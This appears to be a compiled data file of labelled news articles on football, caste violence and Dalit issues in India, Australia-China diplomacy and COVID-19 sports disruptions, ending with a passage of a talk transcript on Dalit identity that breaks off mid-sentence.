Fans in the Senegalese star's village of Bambali jumped up and down, waving shirts above their head after he beat Mohamed Salah and Riyad Mahrez to the prestigious award. It was the first time Mane, 27, has won the award - with Reds team-mate Salah winning the last two. Mahrez had won the award in 2016, after Pierre-Emerick Aubameyang ended Yaya Toure's four-year winning streak in 2015. Mane is a hero in his home town after generously building schools and hospitals there over the years. And locals crowded around a big screen in the heart of the village, as they nervously waited for the announcement. Mane was the deserved winner of the award, having scored a staggering 31 goals in 52 games for the Reds in 2019. He was a key man as Jurgen Klopp's men lifted the Champions League trophy and then stormed to the top of the Premier League table, too.

0," Alleging that police inaction led to the murder of a Dalit couple in Kodumudi on November 14, the Dalit Liberation Movement – Tamil Nadu has urged the Director General of Police to register a case against the personnel at the Kodumudi police station. In a petition sent to the DGP, Chennai, the movement’s State general secretary S. Karuppiah said that S. Ramasamy (58) of Chitta Pulla Palayam Colony in Kodumudi and his wife R. Arukani (56) were murdered in the early hours of November 14 by some men belonging to another community. The petition said that Ramasamy’s daughter Menaka and her husband Perumal had come to the village to celebrate Deepavali when a seven-member gang, led by one Surya, harassed her at 9.30 p.m. on November 13. The couple suffered injuries after they were attacked by the gang. Menaka’s father questioned Surya, and left home. Menaka and Perumal went to the government hospital for treatment and the police were alerted about the incident. But the police, instead of initiating action against Surya and others, pacified them and let them go, the petition alleged. At 1.30 a.m. on November 14, the elderly couple was murdered. “If the police had taken action and arrested the gang, the murders would not have taken place,” the petitioner said and demanded action against the Inspector of Police, Sub-Inspector and personnel on duty at the station. “Case should be registered under Section 4 (neglect of duties) of the Scheduled Castes and the Scheduled Tribes (Prevention of Atrocities) Act, 1989”, the petitioner said.

0,"Discover Thomson Reuters By Kirsty Needham 3 Min Read SYDNEY (Reuters) - Australian Foreign Minister Marise Payne has cautioned China against attempts at “economic coercion” as Australia pushes for an investigation into the coronavirus pandemic that China opposes. Chinese ambassador to Australia, Cheng Jingye, said in a newspaper interview on Monday the “Chinese public” could avoid Australian products and universities. Australia last week called for all members of the World Health Organization (WHO) to support an independent review into the origins and spread of the coronavirus, and is lobbying world leaders. China’s foreign ministry has attacked the proposal. “Maybe the ordinary people will say ‘Why should we drink Australian wine? Eat Australian beef?” Cheng said in the interview published on the front page of The Australian Financial Review. Cheng said it was possible that tourists may have “second thoughts” about visiting Australia. “The parents of the students would also think ... whether this is the best place to send their kids,” he added. After energy exports, education and tourism are Australia’s biggest export industries, with China the largest market. Payne said in a statement on Monday that Australia had made a “principled call” for an independent review of the COVID-19 outbreak which started in the Chinese city of Wuhan. “We reject any suggestion that economic coercion is an appropriate response to a call for such an assessment, when what we need is global cooperation,” Payne said. China is the largest export market for Australian wine and beef. During strained diplomatic relations with China in 2018, Australian wine faced import delays in China and some Australian beef exports were also previously suspended for a period. The Chinese embassy in Australia has previously warned Chinese students about what it said were safety risks in travelling to Australia. Payne said an “honest assessment” of the pandemic would seek to strengthen the WHO’s role. Chinese foreign ministry spokesman Geng Shuang dismissed calls for an investigation during a daily briefing in Beijing, though not commenting specifically about Australia. “China is the first country to report a COVID case, but it doesn’t mean the virus originated in China,” he told reporters. “Some people are trying to hype up the so-called investigation that is inconsistent with an international atmosphere of cooperation and their political manoeuvring will not succeed.” The novel coronavirus has infected 2.97 million people worldwide and killed more than 205,000, a Reuters tally shows.

0,"OR   KOLKATA: West Bengal Chief Minister Mamata Banerjee on Monday called Union Home Minister Amit Shah's recent visit to the state a ""show off"" and alleged that the lunch he had with a Dalit family during his visit was prepared by a Brahmin cook. She also claimed that the BJP leader garlanded a wrong statue thinking it was tribal freedom fighter Birsa Munde.  While speaking in Khatra area of tribal-dominated Banura district, Mamata Banerjee said, ""Honourable Home Minister Amit Shah visited West Bengal a couple of days ago just for show off. He ate with a Dalit family here but made sure his food was brought from outside and cooked by a Brahmin.""  “There were visuals that the Dalit family was cutting cabbage and coriander, but none of these was seen (on his plate). He had eaten Basmati rice, posta bora (poppy seed fritters),” she said, adding after having lunch he went away. “There was a child suffering from Thalassemia or some disease whom he didn’t meet”.  The West Bengal CM also took a dig at the Union Home Minister saying he garlanded a statue of a hunter, thinking it was of Birsa Munde. She then added that her party workers will ensure that Munde's statue is installed in Khatra.  ""In fact, the state government will announce holiday on Birsa Munda’s anniversary from next year. It will be updated in the state’s holiday list,"" she said.  During a two-day visit to West Bengal earlier this month, Shah met the family in Chaturthi village of Bankura and had food with them on November 5. "

0,"The culprits had raped the Dalit woman four months ago when she had taken her goats for grazing. The culprits had filmed the act and threatened the victim to keep mum. Cases of sexual exploitation against women do not seem to end in the Congress-ruled state of Rajasthan. After a case of gang-rape of two minor girls was reported a few days ago, now another case of gang-rape of a Dalit woman has come to light from Jalore in the state. According to reports, the incident happened around four months ago but the victim reported the matter to the police yesterday after the culprits allegedly circulated a video of the incident that they had recorded. The victim had reportedly taken her goats for grazing when the incident happened four months ago. The culprits named Ratnaram Chawdhery son of Dargaram, Bheekharam Patel son of Chatraram and Narayanram son of Sanklaram threatened her with a knife and gang-raped her. They recorded a video of the act using victim’s phone and then transferred it to one of the culprits’ phone. The victim kept mum because the culprits had her video. They also asked her to bring four other girls along and not to tell anyone about the incident. A case has been filed by the police against the culprits on the victim’s information. A medical examination of the victim was conducted in Ahor Hospital. The police are on the lookout for the culprits. According to police, the accused had gangraped the 18-year old victim around four months ago and had filmed the act. Later on, when the victim failed to bring four other girls to them, they circulated the video of the gangrape on social media. The Congress-ruled state has witnesses several cases of rape in this month alone. Earlier this week, two minor girls were kidnapped from their in Bhinmal region by four men who took them to a deserted place and gangraped them. Interestingly Congress scions Rahul Gandhi and Priyanka Gandhi Vadra who had flocked the Hathras victim’s house in Uttar Pradesh along with hundreds of Congress workers seem to have failed to keep their own house in order.

0,"Published: 03rd July 2020 At 29, Sudha Muttal has managed to deliver over 5000 performances and is changing the lives of young Dalit women in her village in rural Karnataka using the power of theatre Sudha Muttal help women read and write Kannada While we know that it is not easy, especially for women, to get recognition in the field of theatre, music and dance, some of them dedicate their lives to the pursuit of art and make a difference to society. Sudha Muttal is one of those people who fought many odds to carve a niche for herself as a theatre artist. Coming from a family of Dalits, she had to face several obstacles — but she did not let the caste discrimination or financial constraints come in her way. This 29-year-old theatre artist narrates her tale, ""No one would believe that caste discrimination existed and still exists in the education sector. I studied in a government school and we were always made to sit on the last bench. I remember teachers gave a lot of importance to students who came from upper caste or rich families and ignored students belonging to the economically backward classes or were Dalits. This ignorance grew to the extent that my friends and I left the school when we were in Class VII. We chose to do menial jobs and started working in fields and would tend to the cattle and so on. We would not earn much but at that point in time, the money was enough to fill our stomachs.""  As days passed by, Sudha got used to the routine and she worked in the fields without any complaint. She even worked at a construction site to earn money to support her family. But little did she know that her future would change drastically because of the interference of one of her teachers. Sudha explains, ""I don't remember the exact year, but Government of India started Kasturba Gandhi Balika Vidyalaya in our village Bannikoppa in Koppal. And they enrolled all the girl students, especially those who were school dropouts from poor families. One of the teachers who taught me in the government primary school enrolled me in the KGBV."" And life just changed all at once. She adds, ""I think this was the turning point in my life because whatever I am today is all because of this school. Since it was a residential school for girls, there was no question of meeting my parents every day. It was tough to be away from my family but it made my life more disciplined. I learnt yoga, vocal music, dance and drama which shaped my future. I participated in every school level and taluk level competition and won several prizes. Soon after completing Class X, I did my PU at a government college in Koppal.""  Before Sudha could opt for higher studies, she had to choose a stream that would get her a job and put her talent to use. That's when Sakhi, an NGO that works to empower youth and rural women, came to her rescue. ""Sakhi handheld me in many ways but this was not the first time that I met them. They had trained me in dance and drama during my high school days and realised that I had the potential to be a great actor. The NGO had also paid my school fees when my parents couldn't afford to pay. Hence, they suggested that I pursue a Diploma in Theatre from Ranga Adhyayana Kendra in Kundapura. My elder sister, who worked as a librarian, encouraged me to take up the programme but my parents were sceptical of whether it would secure my future. I did not heed what others thought and went ahead and did it."" At Ranga Adhyayana Kendra, Sudha learnt the nuances of acting, facial expressions, dialogue delivery and honed her skills. But even before she pursued that diploma, Sudha got a break in theatre at the Rangayana in Mysuru in 2010. Malegalalli Madumagalu, a novel by Rashtrakavi Kuvempu was adapted as a play that went on for nine hours and consisted of 300 actors. Sudha, who has since been a part of this production more than 50 times, says, ""I played the character of Subbanna Hegde's daughter Manjamma. I can never forget this play and my experience as an amateur artist. In fact, many people still recognise me as Rangayana's Manjamma.""  After the diploma, she was lucky enough to find work doing what she loved, ""Soon after completing the diploma in 2012, I started working for the government. The state government hires artists on contract basis and give them a salary to be part of various projects. Here, we not only enact plays for entertainment but also work on projects designed to create awareness among people. The most recent one that we enacted was the life of Mahatma Gandhi to commemorate his 150th birth anniversary,"" she states. Sudha travelled across India performing thousands of shows and gaining recognition. Gradually, her parents and villagers started respecting her and showcased her as a role model for many youngsters. People in her village, who had once mocked her for being a Dalit, would now boast of Sudha's accomplishments. ""No one will believe me if I tell them that Dalits were made to wait to fetch water from the lake. We had to wait until a particular person from a upper caste would come and pour water in our vessels and pots. Now, this practice has been abolished but it took so many years of hard work to deliver a message that Dalits can also achieve anything,"" says Sudha, whose dreams are beyond anyone's imagination.  What dreams, you wonder? Sudha's dream was to start an academy that can train people in her district in all the forms of art. Towards this end, she started her own organisation called Aksharadavva Savithri Bhai Phule Kalaranga Samsthe in 2018. This NGO was started to empower many Dalit youngsters and women like her. ""Bannikoppa is a highly backward and agrarian region in Koppal. There are many families and people like me and art is the only medium to bring them to the forefront. Being financially backward, it is not easy for them to afford to learn music, dance or acting. That's why I taught them dance and music. Meanwhile, the school-going girls learnt acting and dance. Simultaneously, I started a night school for illiterate women. According to me, these women should know to read and write basic Kannada. If someone hands over a legal document to them and asks them to sign ot, they must be capable of reading it. Around 60 people joined my night school wanting to read and write."" Besides acting, music, dance, Sudha has learnt traditional forms of art like dolly kunita and kamsale which were once performed only by men. Isn't it a sign of women empowerment? Now, her team that comprises young girls has learnt these forms and they go around performing in different villages and cities. Sudha proudly tells us, ""The money that we earn is invested back into our group. Recently, we started a Stree Shakti Scheme to apply for bank loans. The middle-aged and old women want to start a small scale business at home instead of working to earn meagre amounts in fields. But due to the pandemic, all the work is on hold. We hope the situation of uncertainty will clear soon and our group goes around performing across the state.""

0,"The inebriated youth killed the boy for mocking at him Published: 02nd January 2020 05:29 AM | Last Updated: 02nd January 2020 05:29 AM | A+A A- A house belonging to of one of the accused’s relatives which was vandalised by the kin of Nagulan | EXPRESS THOOTHUKUDI: Security was beefed up and officials were keeping a watchful eye on North Muthalapuram in the district, where a group of vandals swooped down on the houses of the man suspected of murdering a six-year-old boy. The vandals reportedly damaged the houses of Arulraj’s (26) parents and siblings, apart from setting afire a couple of bikes. However, Thoothukudi Superintendent of Police Arun Balagopalan told TNIE that the situation was under control and police were keeping the issue from snowballing. Nagulan (6), son of Jaishankar and Revathi of North Muthalapuram, was allegedly strangulated to death by one Arulraj (26) of the same village. While Nagulan belongs to a Dalit community, Arulraj is from a Backward Class community. The boy’s body was found amid bushes on the outskirts of North Muthalapuram on Tuesday. Police said Arulraj, who was drunk during the incident, confessed to having killed Nagulan after the boy mocked him. On Wednesday, Nagulan’s relatives allegedly vandalised the houses of Arulraj’s parents, brother and sister. They also damaged the house of Arulraj’s friend, besides setting fire to two vehicles parked in front of Arulraj’s house, sources claimed. Alarmed by the development, people from Arulraj’s community said they grieved for the boy, but found the act of vandalism unethical. Meanwhile, the Superintendent of Police said, “We are monitoring the situation. We are waiting for a complaint from the victims to register a case.” Arulraj is a suspect in many theft and robbery cases under Kovilpatti, Masarpatti and Ettayapuram police station limits. He was arrested a few years ago in connection with the murder of a 60-year-old woman. O P E N Disclaimer : We respect your thoughts and views!

The Chinese women’s national football team has been quarantined in Australia over concerns about the spread of coronavirus, health officials said. Queensland state chief health officer Jeannette Young said 32 people — including players and staff — had travelled through the virus-hit Chinese city of Wuhan a week ago. The team will be kept in isolation in a Brisbane hotel until next Wednesday. The group arrived in Brisbane on a flight from Shanghai on Tuesday before border officials placed them in isolation. They are travelling with a team doctor and none has shown symptoms. Important health announcement re: #CoronavirusAustraliaIf you’ve recently travelled to mainland China & have flu-like symptoms (fever, cough, sore-throat, shortness of breath) seek medical advice. Tell them your travel history before attending.More info: https://t.co/W3BYPpF1kZ pic.twitter.com/loAA52i2OL — Australian Government Department of Health (@healthgovau) January 29, 2020 The international ski federation on Wednesday cancelled the first World Cup races scheduled for testing the mountain venue for alpine skiing at the 2022 Beijing Olympics. A men’s downhill had been scheduled for February 15 at Yanqing to start a two-race weekend. FIS said in a statement that it would advise later if the downhill and super-G races will be be rescheduled. That followed a decision by the International Hockey Federation (FIH) to postpone Pro League games in China, and qualifiers for the Tokyo Olympics, scheduled in February in football, basketball and boxing, being moved outside China. The Chinese women’s hockey team was due to host Belgium for two games on February 8-9 in Changzhou. Those were postponed on Tuesday by the FIH, citing “current uncertainties around the outbreak of the coronavirus in China”. The governing body said it was “following the recommendations of the World Health Organisation”, ahead of future matches. China is scheduled to host Australia for two games on March 14-15. The biggest upcoming event in China is the Formula One Grand Prix in Shanghai on April 19, which draws large crowds for the race and for practice and qualifying. Olympic qualifying events scheduled in China in February to help decide entries for the Tokyo Games have also been affected in recent days. Women’s football and women’s basketball games were moved to Australia and Serbia. The football games had already previously moved from Wuhan, at the centre of the outbreak, to Nanjing. Boxing tournaments for the Asia and Oceania regions will be held in Jordan in March. Tokyo governor Yuriko Koike acknowledged her concern about the virus ahead of the Olympics. Games organisers put out a statement on Wednesday, saying: “Counter measures against infectious diseases constitute an important part of our plans to host a safe and secure games,” and officials will “carefully monitor any incidence of infectious diseases and we will review any counter measures that may be necessary with all relevant organisations”."
0," Gaurav Somwanshi (Round Table India and SAVARI have been hosting a series of online talks by activists and thinkers on issues of importance to the Bahujan. This is the transcript of Gaurav Somwanshi's talk on June 21st, 2020) Whatever I'm going to talk about today is primarily built upon the articles that I wrote, back in September 2016-17. Of course, I've built upon many other things, but the core has remained more or less the same. In fact, I’ll be quoting most of them directly. So those articles were written in the aftermath of what was happening regarding the Rohith Vemula institutional murder case. Because many different kinds of reactions were popping up, but there was a certain kind of trend in them. And so that was one trigger. The second was the readiness of the mainstream to welcome the word Dalit or any other questions on caste. I remember when I was a child, I hardly ever heard that word, other than in my own family, when there was the talk of the autobiographies; but nowhere outside. But then later on, it became more ubiquitous. I have never heard of the word much in my home or in the community as much as it has been heard outside. It's not a word that we use to address each other. How we address each other is with Jai Bhim ­– just normal human beings proudly claiming their Ambedkarite legacy and just saying Jai Bhim. But getting called Dalit from the outside, that's something that was happening a lot more. So, in the wake of that entire scenario, these articles were written. And I'm going to mostly summarize the arguments that I was making back then. So, as I said, one of the things that happened, I think all of us must remember, was that the Allahabad court judge appointed to the inquiry commission declared that Rohith Vemula was not a Dalit. So that was their response to the mass movement that had erupted across universities rather organically. Of course, it was appropriated later on, but while it was alive, that is the kind of strategy they had to deploy. They had to say that he's not a Dalit. What was it supposed to do? I mean, keeping aside the disgusting aspect of this strategy by the murdering administration, more importantly, I decided to ask myself that why the space for this savarna strategy was even created? And what narratives is it drawing upon? Because weapons and tools do not exist in isolation, right? They are created, time and again, as and when narratives are pushed forward, appropriated and all of that process goes on. So, what narratives were they drawing upon when they said Rohith Vemula was not a Dalit? Why did they think that this strategy would even work? And of course, the second thing was what I just said: the rising comfort, eagerness, enthusiasm, readiness to include the word Dalit everywhere – no matter if it's a syllabus or a column, or a book that you’re going to write which will have a certain section on it, or a new course. The word Dalit was proliferating at a great scale and almost every major mainstream media outlet, be it television channel, magazine, or social media page, had something or the other containing the word Dalit. So, what had really changed? Was it really the case that the assertion is now so powerful that it's making its way into the mainstream, or rather, the hegemonic imagination? Or was it the perversion of the same assertion by the Savarnas and they were trying to commoditize that identity? Because if the oppressor is celebrating you for some reason, then isn't it common-sense to view it with caution? We spent our childhood just fighting with the Savarna gangs regarding the reservation debates. That was in vogue at that time. I think it's not so much in vogue right now. So earlier it was like, the entire caste system and everything, just drop everything and you have to debate over reservations. So, reservation is equal to caste system was the equation. And now we have Dalit is equal to the caste system. And hence Dalit is getting propped up everywhere. But this is not representation. This is not a representation where people belonging to Dalit community would be given a chance to exist as equals in the spheres of power, where only Brahmin-Savarnas used to exist before. No. This is – even tokenism is such a mild word – this is a very dehumanizing tokenism where you have to exist as a Dalit man, play the role of a Dalit man and you have to do this in stark contrast to everyone around you. So that is why Kachra in Lagaan has a physical handicap. And it just doesn't end there. In 1983, Vijay Tendulkar wrote the play Kanyadaan and the play is entirely about how a Mahar man beats up his Brahmin wife, and it’s essentially because he's a Mahar, and that's the whole conclusion of the play. But that's not all. In the original play in Marathi, the Mahar man is just an average person, an average Dalit; I should say an average Mahar in their perception, whatever that means. But when this play was translated to Bengali and played over there, they had to add a physical deformity to him. So that is the steep level of dehumanizing tokenism that they have to go through. And it has now almost become like a ceremonial object presented to the world where you have to speak about your Dalit experiences. How is it more different than the Saraswati Pooja that everyone does before any kind of ceremony? Instead of the Saraswati Pooja, now we have to do this hom havan about Dalit, Dalit, Dalit and Dalit, and say yes, now we are very woke regarding the caste question. Also, it has been my experience and observation so far that most of the liberal minded upper castes of India, or at least the ones claiming to be so, can't handle a Dalit who is fighting to be an equal human. They just can't. But what they really embrace with open arms is a human being who has tweaked and morphed himself/herself into a convenient caricature of what they have defined to be a Dalit man or a Dalit woman. If you are ready to play that role, then they will give you columns to write and international academic opportunities under their gaze, fancy conference invites, a barrage of heart emoticons all over social media and then applause that would shame any rockstar. This is also what they mean when they say pass the mic. What does pass the mic really mean? Pass the mic doesn't mean that I will be able to dismantle the stage, but just that I will be given a chance to perform on their stage. So that is not something that one is interested in doing, if one is really serious about annihilation of caste, right? So why does this happen? Why is this narrative issued: pass the mic to them, tell us about the Dalit experiences, inclusion, diversity and all of these modern tantra-mantras? Why do they keep popping up? Now, before I proceed ahead, this is something more of a disclaimer. And I think that everyone is aware of it, but it's very important for me, lest I am misrepresented later on. So, I'll have to explain first what an assertion is, and I'm sure everyone in the talk knows, but I’m going to repeat. So, my own assertion of who I am, and also the rejection of who I am not, it takes place in the response to certain strains of casteism that exist around me. So, let's look at two such different strains of casteism. So, in the first case – and I think many scheduled castes and scheduled tribes and anyone else who’s not a Brahmin-Savarna would have experienced this – there'll be a constant onslaught by the caste society, when they're trying to tell me who they think I am, when they say things like SC has no merit. And this is the most readily relatable when your surrounding society is so called right-wing upper-caste. In such instances, rejection of what they say I am becomes assertion. Now in the second case, the situation isn't so different when your surrounding society is, let's say, of some liberal kind, or any place where you have managed to push yourself to a certain limit. So, in the second strain of casteism, just to give an example, let's say I'm becoming more and more vocal on caste, and there is a constant downpouring of “No, no, no, but we are all humans”. So, suddenly they remember that we’re all humans and I’m not a scheduled caste individual. Only because I'm trying to threaten their spaces, they tell me that past is past. And this happens because a major part of the brahmanical ploy has been to erase history while keeping everything else intact. And just to quote Kuffir da, as he said, Indian history is such a colossal crime because by depriving dalit-bahujans of any past, it steals their future too. So quite often we find ourselves alienated in our own country, like Babasaheb said. But again, coming back to those two different kinds of assertion, which seem different only on a superficial level. So, in the first example, we’re going to just look at three lines from a poem by Madduri Nageshbabu titled Caste Certificate. So, how he ends the poem is: my caste certificate shall become the foreword of the new history that I shall write So, here he is asserting his own caste certificate and making assertions of one’s own social and historical location, to make sense of the present and to push back against the burden of the Brahmanical machinery. This is exactly what is again echoed in a different sense by the writer Shankarrao Kharat. And after conversion, he's saying that I am not a Mahar, I am not an untouchable, I’m not a dalit, I'm not even a Hindu. I'm a Buddhist, and I have become a human being now. I am not lowborn or inferior. And now I am a human being like all others. So, do you think that Nageshbabu’s assertion that my caste certificate is now my foreword, as well as Mr. Shankarrao Kharat’s assertion, are these two really opposite? Because they're really not. They were placed in certain contexts. Nageshbabu was countering a certain context. Shankarrao Kharat was countering a certain context. In one case, they were claiming their historical and social location without compromising their humanity. In the second case, they were rejecting the dehumanized definitions of humanity and just accepting that now I am a complete human being and I accept that for myself – it doesn't matter how you see me. So, as you can see, considering the contexts, the assertion, as well as the rejection of one’s social or historical location, are in fact, at the base, the same sentiment. So, these are the same because they arise as more of an immune response of the soul. And we have to constantly fight against the Brahmanical tactic, or as Phuley says the brahmani kawa. So, what is brahmani kawa? The caste society will do one of the two things: when it needs to demoralize or dehumanize you, it will either bombard you with caste-based slurs and insults to engrave your inferiority in your soul; or if it is ever faced with the risk of acknowledging its own monstrosity, because now the threat is real and the oppressed are pushing back, in that case, they will try to erase and turn a blind eye to the entire context and background and they will say that whatever is the cause of misery is not caste and so on. So, blurting out casteist slurs, as well as the liberal kneejerk reaction of aren’t we all human, are two sides of the same coin. And even though the assertion that is given against them might come off as opposite, but it's not opposite. And I have an example to share regarding how it is so. And that's why I want to focus upon that. The actual question is not how I am portraying myself or what my definition of everything is, because mostly those definitions have been hijacked long ago and the focus is how they are now manipulating this whole thing. I'd like to just share a small video by Mr. Raja Dhale. It's in Marathi, but I’ll translate. It's less than one minute. Even if you don't understand Marathi, it’s very powerful, the first two lines. https://www.youtube.com/watch?v=4t5IrRj2Crc What you just saw was a founding member of Dalit Panther itself, Mr. Raja Dhale. So, the contribution of Raja Dhale in the movement is, of course, unparalleled, and I need not explain who he is when I’ve already said that he’s a founder of Dalit Panther. And what is he saying right now? He's saying that Dalit hi majhi identity naahi, mi Dalit naahi. It’s very easy to understand. He’s saying that, Dalit is not my identity. I am not a Dalit. So, do you really think that he's trying to negate any kind of history of the Dalit Panther or anything? Of course not. Dalit Panther arose in a certain context, it had a certain purpose and it was countering certain tactics. Now what Brahmanism actually is, we first have to understand. Brahmanism is not a certain rigid set of ideologies. No, it's rigid about maintaining the status quo in the material world. For that they can morph any type of ideology, they will do any kind of thing. All mutations are permissible. Just to give an example, when Akbar came over and he was ruling everywhere, the Brahmins wrote an extra Upanishad as a tribute to him and it was titled Allah Upanishad. So, there is no rigid ideology or principles, even of the wicked kind, other than the thought of supremacy and how to maintain it. The caste system is basically ensuring that the caste mode of production keeps on perpetually going one generation after the other. And in order to do this, it doesn't matter what ideology or what word they have to choose, which caste they have to nominate as kshatriyas, which caste they have to give the bronze medal, someone else a silver medal, everything is permissible, as long as the supremacy is maintained. Whose supremacy? Primarily the Brahmins, surrounded by the Savarnas who are most beneficial to them. And that is why it's more important to understand in that context. That's why this video of Raja Dhale, if somebody is using it to say, “see, he’s opposing Dalit Panther”, that's obviously stupid, right? Dalit Panther is still one thing and what you wanted to achieve with it, that's also there, and what you're saying right now is also there. They do not exist in opposition. Please understand that. He says towards the end that Dalit, hi laadleli identity ahe. Laadleli identity means it is an imposed identity. I am not born as a Dalit. I am seen as a Dalit by the rest of the society. Now, the question that we'll see later on in the talk, is how much the way that you are being seen actually ends up affecting how you see yourselves and also the world around you. That's more of a question that I (usually) leave open for introspection, but I think in this talk, it would be okay to discuss it. If this were a public talk, I would just focus my talk entirely on the Brahmin-Savarna. But here I can talk more about the perception of the identity, which began as an assertion. But now the risk is very real that instead of giving any kind of threat to the Brahmin-Savarna empire, it will just end up morphing me and my own soul – I mean soul in a non-religious sense. So, what's happening today with that identity, according to my own personal opinion, as well as what I've been reading from all the brilliant writers around me.. In Philosophy of Hinduism, Babasaheb said that the purpose of the caste system is basically to realize the ideal and to idealize the real. What does this mean? This means that the varna system is an ideal. It doesn't exist. Of course, it doesn't exist because we are basically born the same. But now that's the ideal of the Manusmriti. How do you realize the ideal? So, they will ensure that the current inequalities of life are more deeply entrenched and more and more consolidation of power happens in certain castes and the rest are dehumanized further. In fact, someone else's dehumanization shows your own god status, and all of this is kept in place. So, what is happening now is that they are trying to realize the ideal. That is what Manusmriti also wanted to do, right? How does it characterize the Shudra category, the Chandal category and many other things? It does so by defining them first. Now that was the idea of the Manusmriti. And what is the idea behind Manusmriti and philosophy of Hinduism? If you ask, why am I born this way? Then they will simply say because of the law of karma. The law of karma basically states that you might have a great potential of being a Kshatriya or a Brahmin later on, but please not in this life because whatever (caste) you're born in this life is because of your deeds in your past life. So, it’s as good as saying that you don't have any control, just accept whatever you have been assigned by birth. And the entire structure was about defining these categories. So, they had set the ideal very nicely. And the only thing they wanted to do, and are still trying to do, especially with this whole idea of the consolidation of the entire Indian empire, was to ensure that we can realize the ideal. So, when I use the word ideal, it doesn't mean a good ideal. It just means the Brahminical ideal, the ideal according to them and how they're trying to realize it. So, yes, of course today, they don't really throw Manusmriti at your face and say that you are born as a Shudra and this is what the shloka number so and so says; but of course it has evolved. Again, getting back to the earlier example: doesn't matter what happens, maybe we become acquainted with more words, like fascism and nepotism and many other kinds of progressive/regressive isms that will come up and prop up again and again, but does the caste system really change? Has the material structure of the caste mode of production changed at all? It hasn't. It means that there must be something again, that they’ll have to reinvent or at least change to ensure that the categories are again, getting more real. How do they do that? I think, and this is also in opposition to strictly what Babasaheb said. He said that, and everyone knows this quote: Unlike a drop of water, which loses its identity when it joins the ocean, man does not lose his being to the society in which he lives. Man's life is independent. He is born not for the development of the society alone, but for the development of his self. So that's what he clearly says. And not to joke around, but probably now the new feminism in vogue will say that why he is saying man and his and all, but let's not go there. But that's how the tools have been already made in order to build a facade of being progressive and attack what is essentially the main ideology of annihilation of caste. But again, getting back to how they're trying to realize the ideal. In fact, Babasaheb also says this repeatedly in other contexts as well. When Babasaheb was quoting Mendel in Annihilation of Caste – I don't have the excerpts in front of me right now – but it says very clearly and everyone must have read that already, that caste is not equal to race. You cannot say that there are genetic differences between one and the other. He clearly makes a distinction that do we really think that the Brahmin of Kashmir and the Brahmin of Chennai, they belong to the same so-called racial stock? Of course not. But that is an ideal. That is what they want to realize. So that's very important. That is the ideal condition, right? There's a varna system and then there are all of these various ways to ensure it happens. Now, what I'm going to say is that the role of the Manusmriti in helping to realize the ideal is a task for which the baton is carried forward and now academia has taken up the baton. I'm going to put forward an argument that I made back in 2016. The argument was that now they're trying to use reification, or racialization, or converting something into a single block or a homogeneous block. And this is happening in a great amount to the Dalit category. So (we’ll see) how does it happen first, and later, we'll see whom does it benefit and whom does it not. So, reification comes from the German word verdinglichung, which basically means making into a thing. So, turning the intangible into tangible. Thingification. Now it's very important to understand that my own identity as Gaurav is forged by dozens of external factors, historical and contemporary, and also partly by how I choose to respond to them. But it does not mean even for a second that I am a different thing in itself. Identity assertion does not mean – and here lies the crucial difference – that my biology, my essence as a human being, or my mind, all of that is in some way distinct from the rest of the non-Dalits and somehow completely equivalent to anyone who comes under their definition of a Dalit. It's basically like saying me and Rahul are exactly the same. Like, if we are dalit, then we are something else, like a different race. Now, if you think that this a very common-sensical thing to say, then please know that the invisibilization and the erasure of this distinction, this simple distinction, this is what reification means. Forget reification, we’ll just call it racialization. This is what racialization means. You are constructing races. But this distinction is the most crucial one, because it lies at the heart of the fight for the annihilation of caste. And what is that fight? It is the fight to reclaim all of human dignity and all the existential freedom in its widest possible meaning, which comes to me just by the virtue of being born as a human being. Because if we are aware of this distinction, then we can rightly situate my Dalitness as arising from someone else's Brahminness, without which it wouldn't exist. And hence, we need to zoom out of our microscopes and focus on the larger, grand source of caste. In fact, probably after this argument is over, Anu di and Rahul can also expand upon the ridiculousness of claiming that someone born and brought up and enjoying all the US benefits still claims to be a Dalit. To summarize this, I'll just quote Ta-Nehisi Coates. He says it simply in one line. He says that race is the child of racism, not the father. It's not a chicken and egg thing. First we had racism, then we had race. Because racism chose to – in the context of West – arbitrarily use a geographical setting and skin color. And by using that as a differentiating factor, they started creating races out of it. I hope it doesn't, but it's certainly happening over here as well. So, unless we introspect on this thing, then what will happen, what are the risks? The risk is that, this entire caste question – which is the question of all Indians, of the subcontinent, rather – this will be twisted into something like a survival competition between two species. Like we had about 15,000 years ago or earlier, Neanderthals vs. Homo Sapiens. And this will just be like two people fighting for co-living. And this is why it has become so convenient for NGOs and progressives alike, to focus on the Dalit part and squeeze out the juice from that term, as much as they can, and call themselves anti-caste without ever having had to land a single blow on the system which is facilitating that entire oppression. Now it is the reification of the term Dalit, which is allowing for the interrogation of caste to begin there and end there also. So it is like that joke by Arshad Warsi in Munnabhai MBBS: “Arey! Ye room to khulte saath hi band ho gaya (Hey! This room ends as soon as it starts)”. That’s what’s happening with Dalit also. Dalit is that small room, like we have a devghar (god-house) in Marathi houses. So, it's like, if you want the progressive house, you have a small devghar for Dalit over there. Again, this is the reification, or rather the racialization, of the Dalit identity, which is converting it into a commodity. Less than an identity, but more than a commodity. And this is what is ensuring that Dalit becomes something to be studied, to be critiqued, to be used in a comparison to the thousands of intersections that could be made: middle-class Dalit, urban Dalit, rural Dalit, Dalit capitalist, sarkari Dalit, chaatu Dalit, ye Dalit, wo Dalit. All of these slices could be made because the cake has been made, the cake has been served on the platter, then why would they not slice it? And in fact, it even grants them additional spaces to be usurped by taking one token Dalit and opening up a Dalit studies department. Now we’ll just come to the final part. The final part is whom does it benefit? So, before going there, and in fact, in tandem with Sruti Herbert’s talk last Saturday, where she discussed the non-Dalit part of Sharmila Rege, I'm going to take an example. So, in my article Tilak, the granddaddy of all Hindutvavadis[1], I talk about Tilak. What was making his blood boil in the 1930s? So those were the times when the Maharashtrian anti-caste movements had begun using words like Brahmanetar. Brahmanetar just means non-Brahmin, other than Brahmin. So, an editorial was published in his celebrated, so-called nationalist newspaper Kesari, in which he used to abuse Shahu Maharaj more than he abused the British. So, in that editorial on 26th March, 1913, Tilak wrote in a very angry frustrated manner against the word Brahmanetar, he was arguing against the usage of the word non-Brahmin. And he said that sahi hai, tum yahi use kar rahe ho. If you are using this word, then you must also include the British, the Muslims, the trees, the non-trees the rats, the jungles and everything. So, if it's a Brahmanetar thing, then it should include everything, right? The rest of the world. Do you find any kind of link between Tilak’s anger over the use of the word Brahmanetar/non-Brahmin and the eagerness of people like Sharmila Rege to use the word non-Dalit and also call themselves non-Dalit? Is it not the same line? What is the distinction between the two? It’s the same thing. He was arguing against non-Brahmin. Here we have the entire academic structure using the word non-Dalit. Tilak would be so proud. And how did it come to this? In Babasaheb’s own words, how did the fight to reclaim human 